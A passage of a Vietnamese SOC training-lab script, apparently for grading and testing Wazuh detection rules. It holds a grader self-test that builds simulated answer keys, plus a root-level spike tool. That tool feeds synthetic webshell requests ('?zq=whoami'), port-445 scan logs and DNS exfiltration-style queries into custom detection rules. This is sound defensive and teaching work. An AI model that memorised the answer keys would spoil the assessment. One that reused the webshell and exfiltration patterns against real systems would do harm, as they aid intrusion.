import importlib.util, os, re, sys, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "_shared"))
from socq import ca  # noqa: E402

spec = importlib.util.spec_from_file_location("score18", os.path.join(HERE, "score-bai18.py"))
score18 = importlib.util.module_from_spec(spec)
spec.loader.exec_module(score18)


def canon(v):
    v = sorted({int(x) for x in v})
    return int("1" + "".join("%05d" % x for x in v)) if v else 0


def crc(t):
    return zlib.crc32((t or "").strip().lower().encode())


# ------------------------------------------------------------------ prestop gia
def siem_out(s, w, rules, live, ended=True):
    o = ["SIEM18_MARKER", "SHIFT_END=%s" % ("Y" if ended else "N")]
    if not ended:
        X = 999999
        o.append("SHIFT_RUNNING")
        for k in range(1, 14):
            o.append("GT_INC_%d=%d GT_V_%d=%d GT_P_%d=%d GT_E_%d=%d GT_ISP1_%d=%d" % (k, X, k, X, k, X, k, X, k, X))
        o += ["GT_SC_TK_C=%d GT_SC_HOST_C=%d GT_SC_HOSTIP_C=%d GT_SC_GIAI_DOAN=%d" % (X, X, X, X),
              "GT_SC_T1=%d GT_SC_T2=%d GT_SC_T3=%d GT_SC_T4=%d" % (X, X, X, X),
              "GT_SC_ASSET=%d GT_SC_STAGE=%d GT_SC_MITRE_C=%d GT_SC_IOC_C2=%d GT_SC_DE_XUAT_C=%d" % (X, X, X, X, X)]
        return "\n".join(o) + "\n"
    tk = sorted((e["at"], e["inc"]) for e in s["events"] if e["kind"] == "ticket")
    for k, (_, inc) in enumerate(tk, 1):
        a = s["answers"][inc]
        o += ["GT_INC_%d=%s REL_%d=%d" % (k, inc[4:], k, 1000 + k),
              "GT_V_%d=%d GT_P_%d=%d GT_E_%d=%d GT_ISP1_%d=%d" % (k, a["V"], k, a["P"], k, a["E"], k, a["isp1"])]
    sc = s["sc"]
    o += ["GT_N=%d" % len(tk), "GT_SC_TICKETS=%s" % ",".join(t[4:] for t in sc["TICKETS"]),
          "GT_SC_HOST=%s GT_SC_GIAI_DOAN=%d GT_SC_ASSET=%d GT_SC_IOC_C2=%d" % (sc["HOST"], sc["GIAI_DOAN"], sc["ASSET_LEVEL"], sc["IOC_C2"]),
          "GT_SC_MITRE=%s GT_SC_DE_XUAT=%s" % (",".join(sc["MITRE"]), ",".join(map(str, sc["DE_XUAT"]))),
          "GT_SC_TK_C=%d" % canon(t[4:] for t in sc["TICKETS"])]
    o += ["GT_SC_T%d=%s" % (i, t[4:]) for i, t in enumerate(sc["TICKETS"], 1)]
    o += ["GT_SC_HOST_C=%d GT_SC_HOSTIP_C=%d" % (crc(sc["HOST"]), crc(w.ip(sc["HOST"]))),
          "GT_SC_STAGE=%d" % {"A": 1, "B": 2, "C": 3}[sc["STAGE"]],
          "GT_SC_MITRE_C=%d GT_SC_DE_XUAT_C=%d" % (canon(sc["MITRE"]), canon(sc["DE_XUAT"]))]
    o += rules + live
    return "\n".join(o) + "\n"


def def_out(s, w, ans, sc_fields, lt_fields, frozen=True, extra=()):
    o = ["DEFENDER18_MARKER", "SHIFT_FROZEN" if frozen else "SHIFT_RUNNING"]
    tk = sorted((e["at"], e["inc"]) for e in s["events"] if e["kind"] == "ticket")
    for k, (_, inc) in enumerate(tk, 1):
        line = "INC_%d=%s" % (k, inc[4:])
        NA = 999998
        if inc in ans:
            v, p, e, lat = ans[inc]
            line += " ANS_V_%d=%s ANS_P_%d=%s ANS_E_%d=%s FIRST_%d=%d LAT_%d=%d LATOK_%d=%d" % (
                k, v, k, p, k, e, k, 2000, k, lat, k, 1 if lat <= 600 else 0)
        else:
            line += " ANS_V_%d=%d ANS_P_%d=%d ANS_E_%d=%d" % (k, NA, k, NA, k, NA)
        o.append(line)
    o += ["ANS_N=%d" % len(tk), "SCALE=1.0"]
    tks, host, gd = sc_fields
    o += ["ANS_SC_TICKETS=%s" % ",".join(map(str, sorted(tks))), "ANS_SC_TK_C=%d" % canon(tks),
          "ANS_SC_HOST=%s" % host, "ANS_SC_HOST_C=%d" % crc(host), "ANS_SC_GIAI_DOAN=%s" % (gd if gd != "" else 999998)]
    for k, v in lt_fields.items():
        if k in ("TICKET", "ASSET_LEVEL", "STAGE", "IOC_C2") and v == "":
            v = 999998
        o.append("LT_%s=%s" % (k, v))
        if k == "HOST":
            o.append("LT_HOST_C=%d" % crc(v))
        elif k in ("MITRE", "DE_XUAT"):
            o.append("LT_%s_C=%d" % (k, canon(v.split(",") if v else [])))
    o += ["BAN_GIAO_FILLED=6", "KS_TRUOC=3 KS_SAU=4", "KIEM_THU_RUNS=4", "GOI_Y_USES=1"] + list(extra)
    return "\n".join(o) + "\n"


def fallback(role):
    """Chay that _bin/prestop o may khong co sudo/siem -> nhanh du phong (giu cho)."""
    import subprocess
    return subprocess.run(["bash", os.path.join(HERE, "..", role, "_bin", "prestop")], capture_output=True, text=True,
                          cwd="/tmp").stdout


# ------------------------------------------------------------------ mo phong Labtainers
def load_results(p):
    res = {}
    for ln in open(p):
        if not ln.strip() or ln.startswith("#"):
            continue
        name, rest = [x.strip() for x in ln.split("=", 1)]
        parts = [x.strip() for x in rest.split(" : ")]
        cont = parts[0].split(":")[0]
        if parts[1] == "FILE_REGEX":
            res[name] = (cont, "FILE_REGEX", parts[2])
        elif parts[1] == "GROUP":
            assert parts[3] == "REGEX", ln
            res[name] = (cont, "GROUP", int(parts[2]), parts[4])
        else:
            raise SystemExit("loai result la: " + ln)
    return res


def eval_results(res, texts):
    val = {}
    for name, spec_ in res.items():
        txt = texts[spec_[0]]
        if spec_[1] == "FILE_REGEX":
            val[name] = any(re.search(spec_[2], ln) for ln in txt.splitlines())
        else:
            for ln in txt.splitlines():
                m = re.search(spec_[3], ln)
                if m:
                    val[name] = m.group(spec_[2])
                    break
    return val


def eval_goals(p, val):
    goals = {}
    for ln in open(p):
        if not ln.strip() or ln.startswith("#"):
            continue
        name, rest = [x.strip() for x in ln.split("=", 1)]
        parts = [x.strip() for x in rest.split(" : ")]
        if parts[0] == "matchany":
            assert parts[1] == "integer_equal", ln
            lhs = val.get(parts[2])
            ref = parts[3]
            rhs = ref[7:] if ref.startswith("answer=") else val.get(ref[7:]) if ref.startswith("result.") else None
            if not ref.startswith(("answer=", "result.")):
                raise SystemExit("answertag la: " + ln)
            if ref.startswith("result.") and ref[7:] not in RES_NAMES:
                raise SystemExit("result khong ton tai: " + ln)
            if lhs is None or rhs is None:       # Labtainers: result thieu -> loi grader (gap tren VM 26/11)
                raise SystemExit("THIEU result cho goal %s (%s / %s) -> grader Labtainers se loi" % (name, parts[2], ref))
            try:
                goals[name] = int(lhs) == int(rhs)
            except ValueError:
                goals[name] = False
        elif parts[0] == "boolean":
            expr = parts[1]
            toks = expr.replace("(", " ( ").replace(")", " ) ").split()
            py = []
            for t in toks:
                if t in ("(", ")", "and", "or"):
                    py.append(t)
                elif t == "and_not":
                    py.append("and not")
                elif t == "or_not":
                    py.append("or not")
                else:
                    if t in goals:
                        py.append(str(goals[t]))
                    elif t in RES_NAMES:
                        py.append(str(bool(val.get(t))))
                    else:
                        raise SystemExit("ten la trong boolean: %s (%s)" % (t, ln))
            goals[name] = eval(" ".join(py))
        else:
            raise SystemExit("loai goal la: " + ln)
    return goals


# ------------------------------------------------------------------ bai lam gia
def main():
    cfg = os.path.join(HERE, "..", "instr_config")
    global RES_NAMES
    res = load_results(os.path.join(cfg, "results.config"))
    RES_NAMES = set(res)
    s = ca.build(1234, 1795600000)
    w, sc = s["world"], s["sc"]
    tk = sorted((e["at"], e["inc"]) for e in s["events"] if e["kind"] == "ticket")
    perfect = {inc: (s["answers"][inc]["V"], s["answers"][inc]["P"], s["answers"][inc]["E"], 240) for _, inc in tk}
    sc_ok = ({int(t[4:]) for t in sc["TICKETS"]}, sc["HOST"], sc["GIAI_DOAN"])
    lt_ok = {"TICKET": sc["TICKETS"][0][4:], "HOST": w.ip(sc["HOST"]), "ASSET_LEVEL": sc["ASSET_LEVEL"], "STAGE": 1,
             "MITRE": ",".join(sc["MITRE"]), "IOC_C2": sc["IOC_C2"], "DE_XUAT": ",".join(map(str, sc["DE_XUAT"]))}
    rules_ok = ["RULES_VALID=Y", "RA_P100=100 RA_R100=100", "RB_P100=100 RB_R100=100", "RB_NOT_BLIND", "RA_LOADED"]
    live_ok = ["STORM_PEAK=24", "RB_CONTAIN_MIN=12", "C3_SEEN", "RB_FIX_REL=11", "RA_DEPLOY_REL=9", "GATE_RA_DEPLOYED",
               "C5_SEEN", "LICH_CA_RESTARTS=0"]
    p1 = [inc for _, inc in tk if s["answers"][inc]["isp1"]]
    c6 = p1[-1]
    missed_c6 = {k: v for k, v in perfect.items() if k != c6}
    c2p2 = dict(perfect)
    c2p2[p1[1]] = (1, 2) + perfect[p1[1]][2:]
    cases = [
        ("T1 khong lam gi", siem_out(s, w, ["RULES_VALID=Y", "RA_P100=0 RA_R100=0", "RB_P100=67 RB_R100=100", "RB_NOT_BLIND"], ["STORM_PEAK=24", "LICH_CA_RESTARTS=0"]),
         def_out(s, w, {}, (set(), "", ""), {k: "" for k in lt_ok}), {"bai18_gates": False, "gate_no_missed_p1": False, "gate_ra_deployed": False}, (0, 25)),
        ("T2 giai mau day du", siem_out(s, w, rules_ok, live_ok), def_out(s, w, perfect, sc_ok, lt_ok),
         {"bai18_gates": True, "sc1_host": True, "lt_host": True, "lt_mitre": True, "c5_seen": True, "storm_contained": True}, (95, 100)),
        ("T3 bo sot C6", siem_out(s, w, rules_ok, live_ok), def_out(s, w, missed_c6, sc_ok, lt_ok),
         {"gate_no_missed_p1": False, "gate_storm_not_blind": True, "bai18_gates": False}, (80, 98)),
        ("T4 C2 ghi P2", siem_out(s, w, rules_ok, live_ok), def_out(s, w, c2p2, sc_ok, lt_ok),
         {"gate_no_missed_p1": False}, (85, 99.5)),
        ("T5 tat luat R-B", siem_out(s, w, ["RULES_VALID=Y", "RA_P100=100 RA_R100=100", "RB_P100=0 RB_R100=0"], ["STORM_PEAK=24", "RB_CONTAIN_MIN=3", "GATE_RA_DEPLOYED", "RA_DEPLOY_REL=9"]),
         def_out(s, w, perfect, sc_ok, lt_ok), {"gate_storm_not_blind": False, "bai18_gates": False}, (60, 90)),
        ("T6 giua ca (checkwork som)", siem_out(s, w, [], [], ended=False), def_out(s, w, perfect, sc_ok, lt_ok, frozen=False),
         {"v_1": False, "gate_no_missed_p1": False, "gate_storm_not_blind": False, "sc1_tickets": False}, (0, 1)),
        ("T7 LIVE_GAP (stoplab giua bao)", siem_out(s, w, rules_ok, ["STORM_PEAK=1", "RB_CONTAIN_MIN=2", "LIVE_GAP", "RB_FIX_REL=1", "GATE_RA_DEPLOYED", "RA_DEPLOY_REL=9", "C3_SEEN"]),
         def_out(s, w, perfect, sc_ok, lt_ok), {"bai18_gates": True}, (95, 100)),
        ("T8 prestop siem du phong", fallback("siem"), def_out(s, w, perfect, sc_ok, lt_ok),
         {"bai18_gates": False, "v_1": False}, (0, 1)),
        ("T9 prestop defender du phong", siem_out(s, w, rules_ok, live_ok), fallback("defender"),
         {"bai18_gates": False, "v_1": False, "gate_storm_not_blind": True}, (25, 60)),
    ]
    goals_p = os.path.join(cfg, "goals.config")
    bad = 0
    for name, st, df, expect, (lo, hi) in cases:
        val = eval_results(res, {"siem": st, "defender": df})
        g = eval_goals(goals_p, val)
        sc_row = score18.score(st, df)
        errs = ["%s=%s (can %s)" % (k, g.get(k), v) for k, v in expect.items() if g.get(k) != v]
        if not (lo <= sc_row["tong"] <= hi):
            errs.append("tong=%s ngoai [%s,%s]" % (sc_row["tong"], lo, hi))
        gates_score = (sc_row["gate_no_missed_p1"], sc_row["gate_storm_not_blind"], sc_row["gate_ra_deployed"])
        gates_goal = tuple("Y" if g[k] else "N" for k in ("gate_no_missed_p1", "gate_storm_not_blind", "gate_ra_deployed"))
        if gates_score != gates_goal:
            errs.append("cong score %s != goals %s" % (gates_score, gates_goal))
        bad += bool(errs)
        print("%-32s tong=%5s dat=%s cong=%s %s" % (name, sc_row["tong"], sc_row["dat"], "".join(gates_goal),
                                                   ("LOI: " + "; ".join(errs)) if errs else "OK"))
    print("%d ca, %d loi" % (len(cases), bad))
    sys.exit(1 if bad else 0)


RES_NAMES = set()
if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/tools/spike"
cat > "$LAB/tools/spike/spike18.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# spike18.py - spike P1 cua Lab 18, chay TREN siem (root) cua mot lab dang chay
# dung anh soc-wazuh (vd soc-privesc). Can wzapi.py dat cung thu muc.
#
#   python3 spike18.py sa            S-A (1): logtest 3 dinh dang log (khong doi cau hinh)
#   python3 spike18.py sa-live       S-A (2): <localfile> that tren manager -> alerts.json (restart 1 lan)
#   python3 spike18.py sb            S-B   : the luat nao API chap nhan + luat mau R-A/R-B chay that
#   python3 spike18.py sc            S-C   : indexer bulk/search, user chi-doc, index pattern dashboard
#   python3 spike18.py cleanup       go moi thay doi cua spike (localfile, luat, index, user)
#
# Moi lenh in BANG KET QUA de dan vao docs/bai18-trien-khai.md. Ket qua trung gian: /root/.spike18.json
# ============================================================================
import base64, json, os, re, ssl, subprocess, sys, time, urllib.error, urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from wzapi import Wazuh, WazuhError  # noqa: E402

OSSEC = "/var/ossec"
STATE = "/root/.spike18.json"
LOGDIR = "/var/log/soc-shift"
LOGF = LOGDIR + "/spike.log"
MARK = "<!-- spike18-localfile -->"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE


def state(upd=None):
    st = {}
    if os.path.exists(STATE):
        st = json.load(open(STATE))
    if upd:
        st.update(upd); json.dump(st, open(STATE, "w"), indent=1)
    return st


def ts():
    return time.strftime("%b %e %H:%M:%S")          # syslog: ngay 1 chu so dem bang dau cach


def lines_now(tag="SPK"):
    t = ts(); d = time.strftime("%d/%b/%Y:%H:%M:%S %z")
    return {
        "web_syslog": "%s web-shop nginx: 203.0.113.7 - - [%s] \"GET /uploads/av%s.phtml?q=id HTTP/1.1\" 200 512 \"-\" \"curl/8.0\"" % (t, d, tag),
        "web_raw":    "203.0.113.7 - - [%s] \"GET /uploads/av%s.phtml?q=id HTTP/1.1\" 200 512 \"-\" \"curl/8.0\"" % (d, tag),
        "netfilter":  "%s web-shop kernel: [12345.678] ACCEPT IN=eth0 OUT= MAC= SRC=10.10.20.5 DST=10.10.30.11 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=1 DF PROTO=TCP SPT=40000 DPT=445 WINDOW=64240 RES=0x00 SYN URGP=0 %s" % (t, tag),
        "named":      "%s dns-01 named[812]: client @0x7f00 10.10.20.5#53211 (%s.x7q.exfil-cdn.net): query: %s.x7q.exfil-cdn.net IN TXT +E(0) (10.10.10.53)" % (t, tag.lower(), tag.lower()),
    }


def api():
    w = Wazuh("https://127.0.0.1:55000")
    w.login()
    return w


def flat(d, p=""):
    out = {}
    for k, v in (d or {}).items():
        if isinstance(v, dict):
            out.update(flat(v, p + k + "."))
        else:
            out[p + k] = v
    return out


# ------------------------------------------------------------------ S-A (1)
def do_sa():
    w = api(); res = {}
    print("== S-A (1): wazuh-logtest qua API, KHONG doi cau hinh\n")
    for name, line in lines_now().items():
        tok, out = w.logtest(line, None, location=LOGF)
        w.logtest_close(tok)
        dec = (out.get("decoder") or {}).get("name"); par = (out.get("decoder") or {}).get("parent")
        pre = out.get("predecoder") or {}
        rule = out.get("rule") or {}
        fields = {k: v for k, v in flat(out.get("data")).items()}
        for k in ("srcip", "dstip", "dstport", "srcport", "url", "id", "protocol", "action"):
            if k in out:
                fields[k] = out[k]
        res[name] = {"decoder": dec, "parent": par, "hostname": pre.get("hostname"), "program": pre.get("program_name"),
                     "rule": rule.get("id"), "level": rule.get("level"), "groups": rule.get("groups"), "fields": fields}
        print("[%s]\n  decoder : %s (parent %s)   predecoder.hostname=%s program=%s" % (name, dec, par, pre.get("hostname"), pre.get("program_name")))
        print("  truong  : %s" % json.dumps(fields, ensure_ascii=False)[:300])
        print("  luat    : %s lv%s groups=%s\n" % (rule.get("id"), rule.get("level"), rule.get("groups")))
    state({"sa": res})
    print("Can xem: web_* co 'url' va 'srcip' khong; netfilter co 'srcip','dstip','dstport'; named co ten mien o truong nao.")


# ------------------------------------------------------------------ S-A (2)
def conf_add_localfile():
    p = OSSEC + "/etc/ossec.conf"; c = open(p).read()
    if MARK in c:
        return False
    blk = ("\n<ossec_config>\n  %s\n  <localfile>\n    <log_format>syslog</log_format>\n"
           "    <location>%s/*.log</location>\n  </localfile>\n</ossec_config>\n") % (MARK, LOGDIR)
    open(p, "a").write(blk)
    return True


def conf_del_localfile():
    p = OSSEC + "/etc/ossec.conf"; c = open(p).read()
    c2 = re.sub(r"\n<ossec_config>\n  " + re.escape(MARK) + r".*?</ossec_config>\n", "\n", c, flags=re.S)
    if c2 != c:
        open(p, "w").write(c2); return True
    return False


def restart():
    subprocess.run([OSSEC + "/bin/wazuh-control", "restart"], capture_output=True)
    for _ in range(60):
        st = subprocess.run([OSSEC + "/bin/wazuh-control", "status"], capture_output=True, text=True).stdout
        if "wazuh-analysisd is running" in st and "wazuh-logcollector is running" in st:
            return True
        time.sleep(5)
    return False


def do_sa_live():
    print("== S-A (2): <localfile> %s/*.log tren manager" % LOGDIR)
    os.makedirs(LOGDIR, exist_ok=True); open(LOGF, "a").close()
    # Tu nap 3 luat thu level 3 (khong phu thuoc 'sb'): luat nen 31100/4100/12100 deu level 0 -> khong ghi alerts.json
    w = api(); st = state()
    if "orig_rules" not in st:
        state({"orig_rules": w.get_rule_file("local_rules.xml")})
    probe = ('<group name="spike18,">\n'
             '  <rule id="100336" level="3">\n    <if_sid>31100</if_sid>\n    <url>SPK</url>\n    <description>spike web</description>\n  </rule>\n'
             '  <rule id="100337" level="3">\n    <if_sid>4100</if_sid>\n    <match>SPK</match>\n    <description>spike fw</description>\n  </rule>\n'
             '  <rule id="100338" level="3">\n    <if_sid>12100</if_sid>\n    <match>spk</match>\n    <description>spike dns</description>\n  </rule>\n'
             '</group>\n')
    e = put_try(w, probe)
    print("  nap 3 luat thu (100336-100338):", "OK" if e is None else "TU CHOI " + e)
    conf_add_localfile()
    t = subprocess.run([OSSEC + "/bin/wazuh-analysisd", "-t"], capture_output=True, text=True)
    print("  analysisd -t rc=%s" % t.returncode)
    print("  restart manager ...", "OK" if restart() else "CHUA LEN")
    time.sleep(15)            # logcollector bat dau doc file
    tag = "SPK%d" % (int(time.time()) % 100000)
    ls = lines_now(tag)
    alerts = OSSEC + "/logs/alerts/alerts.json"
    pos = os.path.getsize(alerts)
    t0 = time.time()
    with open(LOGF, "a") as f:
        for name in ("web_syslog", "netfilter", "named"):
            f.write(ls[name] + "\n")
    print("  da ghi 3 dong (tag %s) luc %s, doi canh bao toi da 60s ..." % (tag, time.strftime("%H:%M:%S")))
    found = {}
    while time.time() - t0 < 60 and len(found) < 3:
        time.sleep(2)
        with open(alerts) as f:
            f.seek(pos)
            for l in f:
                if tag.lower() not in l.lower():
                    continue
                a = json.loads(l)
                full = a.get("full_log", "")
                name = "web_syslog" if "nginx" in full else "netfilter" if "kernel" in full else "named"
                if name not in found:
                    found[name] = (round(time.time() - t0, 1), a)
    res = {}
    for name in ("web_syslog", "netfilter", "named"):
        if name not in found:
            print("  [%-10s] KHONG thay canh bao trong 60s (co the luat nen level 0 -> khong ghi alerts.json; xem S-A (1))" % name)
            res[name] = None; continue
        dt, a = found[name]
        info = {"giay": dt, "agent": a.get("agent", {}).get("name"), "hostname": (a.get("predecoder") or {}).get("hostname"),
                "location": a.get("location"), "rule": a["rule"]["id"], "level": a["rule"]["level"],
                "srcip": (a.get("data") or {}).get("srcip"), "dstip": (a.get("data") or {}).get("dstip"),
                "dstport": (a.get("data") or {}).get("dstport"), "url": (a.get("data") or {}).get("url")}
        res[name] = info
        print("  [%-10s] %4ss  agent=%s hostname=%s rule=%s lv%s srcip=%s dstip=%s dstport=%s url=%s" % (
            name, dt, info["agent"], info["hostname"], info["rule"], info["level"], info["srcip"], info["dstip"], info["dstport"], info["url"]))
    state({"sa_live": res})
    print("\nDat khi: canh bao <=10s, hostname=web-shop/dns-01 (khong phai siem), co srcip/dstip/dstport/url.")
    print("Luu y: luat nen level < 3 khong ghi alerts.json -> dong do van DI QUA analysisd (luat SV van no duoc).")


# ------------------------------------------------------------------ S-B
TAG_TESTS = [
    ("url pcre2",            '<if_group>web</if_group>\n    <url type="pcre2">^/uploads/[^?]*\\.(php|phtml|phar)\\?</url>'),
    ("url (osregex)",        '<if_group>web</if_group>\n    <url>^/uploads/</url>'),
    ("field url",            '<if_group>web</if_group>\n    <field name="url">^/uploads/</field>'),
    ("id (status)",          '<if_group>web</if_group>\n    <id>^200$</id>'),
    ("dstport",              '<if_group>firewall</if_group>\n    <dstport>^445$</dstport>'),
    ("field dstport",        '<if_group>firewall</if_group>\n    <field name="dstport">^445$</field>'),
    ("dstip",                '<if_group>firewall</if_group>\n    <dstip>10.10.30.0/24</dstip>'),
    ("srcip",                '<if_group>firewall</if_group>\n    <srcip>10.10.20.5</srcip>'),
    ("list srcip address",   '<if_group>firewall</if_group>\n    <list field="srcip" lookup="address_match_key">etc/lists/spike18-hosts</list>'),
    ("list dstport key",     '<if_group>firewall</if_group>\n    <list field="dstport" lookup="match_key">etc/lists/spike18-ports</list>'),
]
FREQ_TESTS = [
    ("same_srcip",           "<same_srcip />"),
    ("different_dstip",      "<different_dstip />"),
    ("different_dstport",    "<different_dstport />"),
    ("different_field dstip", "<different_field>dstip</different_field>"),
]


def put_try(w, xml):
    r = w._req("PUT", "/rules/files/local_rules.xml", raw=xml, ctype="application/octet-stream", params={"overwrite": "true"})
    f = ((r.get("data") or {}).get("failed_items") or [])
    return None if not f else "%s %s" % (f[0]["error"].get("code"), f[0]["error"].get("message"))


def wrap(body, extra=""):
    return '<group name="spike18,">\n  <rule id="100339" level="10"%s>\n    %s\n    <description>spike</description>\n  </rule>\n</group>\n' % (extra, body)


def do_sb():
    w = api(); st = state()
    orig = w.get_rule_file("local_rules.xml")
    if "orig_rules" not in st:
        state({"orig_rules": orig})
    for n, c in (("spike18-hosts", "10.10.20.5:\n"), ("spike18-ports", "9102:\n")):
        w.put_list_file(n, c)
    print("== S-B (1): the nao Wazuh API chap nhan (khong restart)")
    ok = {}
    for name, body in TAG_TESTS:
        e = put_try(w, wrap(body)); ok[name] = e is None
        print("   %-24s %s" % (name, "OK" if e is None else "TU CHOI " + e))
    sa = st.get("sa", {})
    fw_sid = (sa.get("netfilter") or {}).get("rule") or "4100"
    for name, tag in FREQ_TESTS:
        e = put_try(w, wrap("<if_matched_sid>%s</if_matched_sid>\n    %s" % (fw_sid, tag), ' frequency="8" timeframe="120"'))
        ok[name] = e is None
        print("   %-24s %s" % (name, "OK" if e is None else "TU CHOI " + e))
    state({"sb_tags": ok})

    # ---- (2) luat mau chay THAT (can khai bao list trong ossec.conf + restart) ----
    web_sid = (sa.get("web_syslog") or {}).get("rule") or (sa.get("web_raw") or {}).get("rule")
    print("\n== S-B (2): luat mau R-A / R-B tren Wazuh that (luat nen: web=%s, firewall=%s)" % (web_sid, fw_sid))
    if not web_sid:
        print("   Chua co ket qua S-A -> chay 'sa' truoc."); return
    ra_url = '<url type="pcre2">^/uploads/[^?]*\\.(php|phtml|phar)\\?</url>' if ok.get("url pcre2") else '<url>^/uploads/\\S+.ph\\w+?</url>'
    diff = "<different_dstip />" if ok.get("different_dstip") else ("<different_field>dstip</different_field>" if ok.get("different_field dstip") else "")
    port_ok = ok.get("list dstport key") or ok.get("dstport")
    exc_port = ('<list field="dstport" lookup="match_key">etc/lists/spike18-ports</list>' if ok.get("list dstport key")
                else "<dstport>^9102$</dstport>")
    xml = ('<group name="spike18,">\n'
           '  <rule id="100330" level="12">\n    <if_sid>%s</if_sid>\n    %s\n    <description>R-A mau</description>\n'
           '    <mitre><id>T1505.003</id></mitre>\n  </rule>\n'
           '  <rule id="100341" level="0">\n    <if_sid>%s</if_sid>\n'
           '    <list field="srcip" lookup="address_match_key">etc/lists/spike18-hosts</list>\n    %s\n'
           '    <description>ngoai le sao luu</description>\n  </rule>\n'
           '  <rule id="100340" level="10" frequency="8" timeframe="120">\n    <if_matched_sid>%s</if_matched_sid>\n'
           '    <same_srcip />\n    %s\n    <description>R-B mau: 1 may toi nhieu dich</description>\n'
           '    <mitre><id>T1046</id></mitre>\n  </rule>\n</group>\n') % (web_sid, ra_url, fw_sid, exc_port, fw_sid, diff)
    print(xml)
    e = put_try(w, xml)
    if e:
        print("   TU CHOI ca bo: " + e); return
    c = open(OSSEC + "/etc/ossec.conf").read()
    if "etc/lists/spike18-hosts" not in c:
        c = c.replace("<ruleset>", "<ruleset>\n    <list>etc/lists/spike18-hosts</list>\n    <list>etc/lists/spike18-ports</list>", 1)
        open(OSSEC + "/etc/ossec.conf", "w").write(c)
    okv, msg = w.validate(); print("   validate:", okv, msg[:150])
    if not okv:
        return
    print("   restart ...", "OK" if w.restart() else "CHUA LEN")

    def run(lines):
        tok = None; ids = []
        for l in lines:
            tok, out = w.logtest(l, tok, location=LOGF)
            ids.append((out.get("rule") or {}).get("id"))
        w.logtest_close(tok)
        return ids
    t = ts(); d = time.strftime("%d/%b/%Y:%H:%M:%S %z")
    web = lambda u: "%s web-shop nginx: 203.0.113.7 - - [%s] \"GET %s HTTP/1.1\" 200 88 \"-\" \"curl/8.0\"" % (t, d, u)
    fw = lambda s, dst, p: "%s web-shop kernel: [1.0] ACCEPT IN=eth0 OUT= SRC=%s DST=%s LEN=60 PROTO=TCP SPT=40000 DPT=%d SYN URGP=0" % (t, s, dst, p)
    cases = [
        ("R-A webshell tham so la",     [web("/uploads/av.phtml?zq=whoami")], "100330"),
        ("R-A anh binh thuong",         [web("/uploads/logo.png")], None),
        ("R-A script khong query",      [web("/uploads/av.phtml")], None),
        ("R-B quet 10 dich tu web-shop", [fw("10.10.20.9", "10.10.30.%d" % i, 445) for i in range(1, 13)], "100340"),
        ("R-B sao luu dung cong 9102",  [fw("10.10.20.5", "10.10.30.%d" % i, 9102) for i in range(1, 13)], None),
        ("R-B sao luu SAI cong (22)",   [fw("10.10.20.5", "10.10.30.%d" % i, 22) for i in range(1, 13)], "100340"),
        ("R-B 1 dich nhieu lan",        [fw("10.10.20.9", "10.10.30.1", 445) for i in range(12)], None),
    ]
    print("\n   %-30s %-10s %s" % ("kich ban", "mong doi", "luat no (tung dong)"))
    res = {}
    for name, ls, exp in cases:
        ids = run(ls)
        hit = exp in ids if exp else not any(i in ("100330", "100340") for i in ids)
        res[name] = hit
        print("   %-30s %-10s %s %s" % (name, exp or "khong", "DUNG" if hit else "SAI ", ids))
    state({"sb_func": res, "sb_xml": xml})
    print("\nDat khi: moi dong DUNG. Neu 'different_dstip' bi tu choi, R-B mau chay khong co dieu kien 'khac dich' ->"
          " kich ban '1 dich nhieu lan' se SAI: can cach khac (xem bao cao).")


# ------------------------------------------------------------------ S-B2: vi sao R-B tan suat khong no?
def rb_variant(mid_level, diff, exc_parent):
    """mid_level=None: dem thang tren 4100 (level 0). Con lai: them luat trung gian 100342 (su kien ket noi)."""
    diff_tag = {"dstip": "<different_dstip />", "field": "<different_field>dstip</different_field>", None: ""}[diff]
    exc = ('  <rule id="100341" level="0">\n    <if_sid>%s</if_sid>\n'
           '    <list field="srcip" lookup="address_match_key">etc/lists/spike18-hosts</list>\n'
           '    <list field="dstport" lookup="match_key">etc/lists/spike18-ports</list>\n'
           '    <description>ngoai le sao luu</description>\n  </rule>\n')
    if mid_level is None:
        return ('<group name="spike18,">\n' + exc % "4100" +
                '  <rule id="100340" level="10" frequency="8" timeframe="120">\n    <if_matched_sid>4100</if_matched_sid>\n'
                '    <same_srcip />\n    %s\n    <description>R-B</description>\n    <mitre><id>T1046</id></mitre>\n  </rule>\n</group>\n') % diff_tag
    return ('<group name="spike18,">\n'
            '  <rule id="100342" level="%d">\n    <if_sid>4100</if_sid>\n'
            '    <description>su kien ket noi</description>\n  </rule>\n' % mid_level
            + exc % ("100342" if exc_parent == "mid" else "4100") +
            '  <rule id="100340" level="10" frequency="8" timeframe="120">\n    <if_matched_sid>100342</if_matched_sid>\n'
            '    <same_srcip />\n    %s\n    <description>R-B</description>\n    <mitre><id>T1046</id></mitre>\n  </rule>\n</group>\n') % diff_tag


def do_sb2():
    w = api(); st = state()
    if "orig_rules" not in st:
        state({"orig_rules": w.get_rule_file("local_rules.xml")})
    for n, c in (("spike18-hosts", "10.10.20.5:\n"), ("spike18-ports", "9102:\n")):
        w.put_list_file(n, c)
    c = open(OSSEC + "/etc/ossec.conf").read()
    if "etc/lists/spike18-hosts" not in c:
        c = c.replace("<ruleset>", "<ruleset>\n    <list>etc/lists/spike18-hosts</list>\n    <list>etc/lists/spike18-ports</list>", 1)
        open(OSSEC + "/etc/ossec.conf", "w").write(c)
    t = ts()
    fw = lambda s, dst, p: "%s web-shop kernel: [1.0] ACCEPT IN=eth0 OUT= SRC=%s DST=%s LEN=60 PROTO=TCP SPT=40000 DPT=%d SYN URGP=0" % (t, s, dst, p)
    cases = [
        ("quet 12 dich",       [fw("10.10.20.9", "10.10.30.%d" % i, 445) for i in range(1, 13)], True),
        ("1 dich x12",         [fw("10.10.20.9", "10.10.30.1", 445) for _ in range(12)], False),
        ("sao luu dung cong",  [fw("10.10.20.5", "10.10.30.%d" % i, 9102) for i in range(1, 13)], False),
        ("sao luu sai cong",   [fw("10.10.20.5", "10.10.30.%d" % i, 22) for i in range(1, 13)], True),
    ]
    V = [
        ("V1 dem tren 4100 (lv0), khong 'khac dich'", (None, None, "4100")),
